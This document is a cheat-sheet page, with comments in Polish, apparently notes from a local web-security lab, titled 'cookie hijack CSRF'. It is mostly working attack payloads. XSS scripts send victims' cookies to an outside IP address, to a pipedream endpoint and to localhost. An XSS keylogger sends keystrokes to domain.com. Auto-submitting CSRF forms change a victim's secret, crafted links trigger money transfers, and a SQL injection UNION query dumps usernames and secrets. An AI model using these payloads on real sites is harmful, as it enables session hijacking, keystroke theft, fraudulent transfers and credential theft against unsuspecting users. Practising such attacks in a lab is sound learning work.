---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# cookie hijack CSRF

{% code fullWidth="true" %}
```python
<script>new Image.src="http://193.112.33.32/?cookie="+ document.cookie;</script>
```
{% endcode %}

{% code fullWidth="true" %}
```python
<script>alert(document.cookie);</script>
```
{% endcode %}

{% code fullWidth="true" %}
```python
<script>new Image().src="http://127.0.0.1:443/cookie.php?c="+document.cookie;</script>
```
{% endcode %}

{% code fullWidth="true" %}
```python
#z innej strony cookie
<script>new Image ().src="https://enroez62sf5m.x.pipedream.net/cookie.php?c="+document.cookie;</script>
```
{% endcode %}

{% code fullWidth="true" %}
```python
#włączam listenera
nc -nlvp 443

#przejmuje cookie
<script>new Image().src="http://127.0.0.1:443/cookie.php?c="+document.cookie;</script>

#w listenerze mam info o cookie
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```python
#keylogger
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```python
#CSRF POST ATTACK
<html>
    <head>
    </head>
    <body>
        <form name="csrf" action="http://127.0.0.1/csrf_3.php" method="POST">

        <input type="hidden" name="secret" value="hackowany Sekret przez Bee!">

        <input type="hidden" name="login" value="victim">

        <input type="hidden" name="action" value="change">
    </form>
    <script>document.csrf.submit();</script>
   </body>
</html>
==========================
#CSRF (Transfer Amount) GET
http://localhost/csrf_2.php

http://localhost/csrf_2.php?account=123-45678-90&amount=100&action=transfer

#wklejamy link i jesteśmy ubożsi o 1000 Euro :D
http://localhost/csrf_2.php?account=111-5555&amount=1000&action=transfer

#Zmiana portu Apacha, gdyż docker działą na porcie 80
sudo vim /etc/apache2/ports.conf

Listen 8888

sudo service apache2 start

#tworzymy stronę ze złośliwym linkiem
cd /var/ww/html/
sudo nano get_crsf.html

<h1>Nasza super strona!</h1>
<a href="http://localhost/csrf_2.php?account=111-5555&amount=1000&action=transfer">Kliknij mnie!</a>

localhost:8888/get_csrf.html

#i znowu mamy 1000 Euro mniej :(

#CSRF (Change Secret) POST

http://localhost/csrf_3.php

#zakładamy użytkownika victim i logujemny się na niego w prywatnym oknie przeglądarki
secret=secret&login=victim&action=change

#sprawdzenie czy sekret został zmieniony
http://localhost/sqli_1.php

1' UNION SELECT 1,login,secret,4,5,6,7 FROM users -- -

'lub

http://localhost/secret.php

#formularz html
cd /var/www/html/
sudo nano csrf.html

<html>
<body>
    <form action="http://127.0.0.1/csrf_3.php" method="post">
        <input type="hidden" name="secret" value="Sekret zmieniono przez CSRF!">
        <input type="hidden" name="login" value="victim">
        <input type="hidden" name="action" value="change">
    </form>
    <script>
    document.forms[0].submit();
    </script>    
</body>
</html>


<html>
    <head>
    </head>
    <body >

    <form name="csrf" action="http://127.0.0.1/csrf_3.php" method="POST">

        <input type="hidden" name="secret" value="hackowany Sekret przez Bee!">

        <input type="hidden" name="login" value="victim">

        <input type="hidden" name="action" value="change">

    </form>
 <script>document.csrf.submit();</script>
   </body>
</html>

#Hostujemy plik:
python -m http.server -p 8888

localhost:8888/post_csrf.html

#kontrola
http://localhost/secret.php
```
{% endcode %}
